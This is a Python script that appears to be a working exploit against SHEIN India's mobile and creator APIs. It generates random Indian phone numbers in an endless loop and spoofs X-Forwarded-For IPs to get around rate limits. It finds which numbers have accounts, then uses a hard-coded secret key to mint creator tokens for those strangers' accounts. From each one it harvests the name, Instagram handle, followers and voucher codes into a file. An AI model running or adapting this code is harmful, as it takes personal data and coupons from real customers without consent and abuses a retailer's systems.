import requests
import random
import json
import re
import sys
import logging
import time
import os
import threading  # Added for thread safety
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import Timeout, ConnectionError, HTTPError
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- Setup and Configuration ---

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO, datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# Output file where successful profiles will be saved
OUTPUT_FILE = "Data_coupon.jsonl"

SECRET_KEY = os.environ.get("SHEIN_SECRET_KEY", "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg")


# --- Core Fetcher Class (Optimized for Speed and Stability) ---

class SheinCliFetcher:
    """
    A CLI utility to fetch SHEIN profile data, optimized for stability and speed using Session & Caching.
    """

    def __init__(self):
        # API URLs
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.profile_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"

        self.session = requests.Session()
        
        # --- CACHING VARIABLES (NEW LOGIC) ---
        self.cached_client_token_data = None
        self.token_expiry_time = 0
        self.token_lock = threading.Lock()  # Thread safety ke liye
        # -------------------------------------

        # RETRY MECHANISM: 3 retries for stability
        retry_strategy = Retry(
            total=3, 
            backoff_factor=0.5, 
            status_forcelist=[500, 502, 503, 504],
        )

        # CONNECTION POOL SIZE
        adapter = HTTPAdapter(
            pool_connections=50, 
            pool_maxsize=50,
            max_retries=retry_strategy
        )
        
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)


    # --- Utility Methods ---

    def get_random_ip(self):
        """Generate random IP address for X-Forwarded-For header."""
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def extract_access_token(self, token_data):
        """Extract access token from response."""
        if isinstance(token_data, dict):
            for key in ['access_token', 'accessToken']:
                if key in token_data: return token_data[key]
            if 'data' in token_data and isinstance(token_data['data'], dict):
                for key in ['access_token', 'accessToken']:
                    if key in token_data['data']: return token_data['data'][key]
        return None

    def get_client_token(self):
        """Get SHEIN client token with Caching strategy."""
        
        # 1. Check agar valid token already memory mein hai
        current_time = time.time()
        if self.cached_client_token_data and current_time < self.token_expiry_time:
            return self.cached_client_token_data

        # 2. Agar token nahi hai ya expire ho gaya, toh lock lagao aur naya fetch karo
        with self.token_lock:
            # Double check inside lock
            if self.cached_client_token_data and current_time < self.token_expiry_time:
                return self.cached_client_token_data

            headers = {
                'Client_type': 'Android/29', 'Accept': 'application/json', 'Client_version': '1.0.8',
                'User-Agent': 'Android', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
                'X-Tenant': 'B2C', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
                'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
            }
            data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"

            try:
                # logger.info("⏳ Refreshing Client Token from API...") 
                response = self.session.post(self.client_token_url, headers=headers, data=data, timeout=15)
                response.raise_for_status()
                token_data = response.json()
                
                # Token save karo aur expiry set karo (50 minutes)
                self.cached_client_token_data = token_data
                self.token_expiry_time = time.time() + 3000  # 3000 seconds = 50 mins caching
                
                return token_data

            except Timeout:
                logger.error("Timeout getting client token.")
                return None
            except ConnectionError as e:
                logger.error(f"Connection error getting client token: {e}")
                return None
            except HTTPError as e:
                logger.error(f"HTTP error getting client token: {e}. Response status: {e.response.status_code}")
                return None
            except Exception as e:
                logger.error(f"Unknown error getting client token: {e}")
                return None

    def check_shein_account(self, client_token, phone_number):
        """Check SHEIN account and get encryptedId."""
        headers = {
            'Authorization': f'Bearer {client_token}', 'Requestid': 'account_check', 'X-Tenant': 'B2C',
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
            'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = f'mobileNumber={phone_number}'
        try:
            response = self.session.post(self.account_check_url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            return response.json()
        except HTTPError as e:
            if e.response.status_code == 404:
                return None
            # logger.warning(f"HTTP error checking account for {phone_number}: {e}. Status: {e.response.status_code}")
            return None
        except Timeout:
            # logger.warning(f"Timeout checking account for {phone_number}.")
            return None
        except ConnectionError as e:
            # logger.error(f"Connection error checking account for {phone_number}: {e}")
            return None
        except Exception as e:
            # logger.error(f"Unknown error checking account for {phone_number}: {e}")
            return None

    def get_encrypted_id(self, phone_number):
        """Get encryptedId from SHEIN API."""
        try:
            # Uses Cached Token Now
            client_token_data = self.get_client_token()
            client_token = self.extract_access_token(client_token_data)
            if not client_token: return None

            # Small delay maintained here to protect account_check endpoint
            time.sleep(random.uniform(0.1, 0.2))

            account_data = self.check_shein_account(client_token, phone_number)

            if account_data and isinstance(account_data, dict):
                for container in [account_data, account_data.get('data'), account_data.get('result')]:
                    if isinstance(container, dict) and 'encryptedId' in container:
                        return container['encryptedId']
        except Exception as e:
            logger.error(f"Error in get_encrypted_id for {phone_number}: {e}")
        return None

    def get_creator_token(self, phone_number, encrypted_id, user_name="CLI_User"):
        """Get creator access token."""
        headers = {
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '4d9bbb2c54af468f8130b96dac93362d',
            'Content-Type': 'application/json; charset=UTF-8', 'Host': 'shein-creator-backend-151437891745.asia-south1.run.app',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = {
            "client_type": "Android/29", "client_version": "1.0.8", "gender": "male",
            "phone_number": phone_number,
            "secret_key": SECRET_KEY,
            "user_id": encrypted_id, "user_name": user_name
        }
        try:
            response = self.session.post(self.creator_token_url, json=data, headers=headers, timeout=10)
            response.raise_for_status()
            result = response.json()
            return self.extract_access_token(result)
        except Exception as e:
            # logger.error(f"Unknown error getting creator token for {phone_number}: {e}")
            return None

    def get_user_profile(self, access_token):
        """Get user profile with voucher data."""
        headers = {
            'content-type': 'application/json',
            'authorization': f'Bearer {access_token}',
            'X-Forwarded-For': self.get_random_ip()
        }
        try:
            response = self.session.get(self.profile_url, headers=headers, timeout=10)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            # logger.warning(f"Unknown error getting user profile: {e}")
            return None

    def _safe_get_value(self, data_dict, keys, default='N/A'):
        """Safely retrieve value."""
        for key in keys:
            value = data_dict.get(key)
            if value is not None and value != '':
                try:
                    if isinstance(value, (int, float)):
                        return str(int(value))
                    return str(value)
                except:
                    pass
        for key in keys:
            value = data_dict.get(key)
            if value == 0 or value == '0':
                return '0'
        return default

    def format_profile_response(self, profile_data, phone_number):
        """Format profile response for CLI output and structured saving."""
        try:
            if not profile_data:
                return f"❌ No profile data received for phone: {phone_number}", None, None

            user_data = profile_data.get('user_data', {}) or {}
            user_name = self._safe_get_value(user_data, ['user_name'], default='N/A')
            instagram_data = user_data.get('instagram_data', {}) or {}
            username = self._safe_get_value(instagram_data, ['username', 'user_name'], default='N/A')
            followers_count = self._safe_get_value(instagram_data, ['followers_count', 'follower_count'], default='0')
            voucher_data = user_data.get('voucher_data', {}) or {}
            voucher_code = self._safe_get_value(voucher_data, ['voucher_code'], default='N/A')
            voucher_amount = self._safe_get_value(voucher_data, ['voucher_amount'], default='0')

            # Structured data for JSON saving
            structured_data = {
                "phone_number": phone_number,
                "name": user_name,
                "insta_user": username,
                "insta_followers": followers_count,
                "voucher_code": voucher_code,
                "voucher_amount_rs": voucher_amount
            }

            response = f"""
✅ PROFILE FOUND!
  • Phone: {phone_number}
  • Name: {user_name}
  • Insta User: {username}
  • Insta Followers: {followers_count}

🎫 Voucher:
  • Code: {voucher_code}
  • Amount: ₹{voucher_amount}"""

            return response, profile_data, structured_data

        except Exception as e:
            logger.error(f"Error formatting profile: {e}")
            return f"❌ Error formatting profile data. Check logs.", None, None

    def generate_indian_numbers(self, count):
        """Generate a list of random 10-digit Indian mobile numbers."""
        numbers = []
        valid_starters = ['9'] 
        
        for _ in range(count):
            first_digit = random.choice(valid_starters)
            remaining_digits = ''.join(random.choices('0123456789', k=9))
            number = first_digit + remaining_digits
            numbers.append(number)
        return numbers

    def process_single_number(self, phone_number):
        """
        Main logic for a single phone number check with inner delays.
        """

        phone_number = ''.join(filter(str.isdigit, phone_number))

        if len(phone_number) != 10:
            logger.error(f"Invalid length: {phone_number}")
            return None

        # Step 1: Get encryptedId
        encrypted_id = self.get_encrypted_id(phone_number)

        if not encrypted_id:
            return None

        # Step 2: Get creator token
        creator_token = self.get_creator_token(phone_number, encrypted_id)
        
        # Stability Delay
        time.sleep(random.uniform(0.5, 1.0))

        if not creator_token:
            return None

        # Step 3: Get user profile with voucher data
        profile_data = self.get_user_profile(creator_token)

        if profile_data:
            return phone_number, profile_data
        else:
            return None

# --- Main CLI Automation Logic ---

def save_profile_data(formatted_data):
    """Save the found profile data (minimal fields) to a JSON Lines file."""
    try:
        data_to_save = formatted_data.copy()
        data_to_save["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")

        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data_to_save) + '\n')

    except Exception as e:
        logger.error(f"Failed to save profile: {e}")

def main_cli_automation():
    """CLI Entry point for continuous concurrent automation."""

    if len(sys.argv) > 1:
        print("⚠️ Warning: Command line argument for test count is ignored for infinite mode.")

    fetcher = SheinCliFetcher()

    MAX_WORKERS = 30
    BATCH_SIZE = 2000

    total_checked = 0
    found_count = 0

    print("\n" + "#"*60)
    print(f"🚀 Starting CONTINUOUS test mode with {MAX_WORKERS} workers (Token Caching Enabled).")
    print(f"   Batch Size: {BATCH_SIZE} numbers per cycle.")
    print("   Press Ctrl+C to stop the process.")
    print(f"💾 Successful profiles will be saved to: {OUTPUT_FILE}")
    print("#"*60 + "\n")

    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:

            while True:
                # 1. Generate a fresh batch of random numbers
                numbers_to_test = fetcher.generate_indian_numbers(BATCH_SIZE)

                logger.info(f"--- Generated next batch of {BATCH_SIZE} numbers. ---")

                # 2. Submit all tasks to the thread pool
                results = executor.map(fetcher.process_single_number, numbers_to_test)

                # 3. Process results for the batch
                for result in results:
                    total_checked += 1

                    if result:
                        phone_number, profile_data = result

                        formatted_response, _, structured_data = fetcher.format_profile_response(profile_data, phone_number)

                        if structured_data:
                            found_count += 1
                            save_profile_data(structured_data)

                            print("\n" + "="*60)
                            print(f"🎉 FOUND PROFILE! (Total checked: {total_checked}, Found: {found_count})")
                            print(formatted_response)
                            print("="*60 + "\n")

                time.sleep(random.uniform(2.0, 3.0))

    except KeyboardInterrupt:
        print("\n\n" + "🛑"*25)
        print("🛑 Stopped.")
        print(f"Total Checked: {total_checked} | Found: {found_count}")
        print("🛑"*25 + "\n")
    except Exception as e:
        logger.critical(f"A critical error occurred: {e}")


if __name__ == "__main__":
    main_cli_automation()
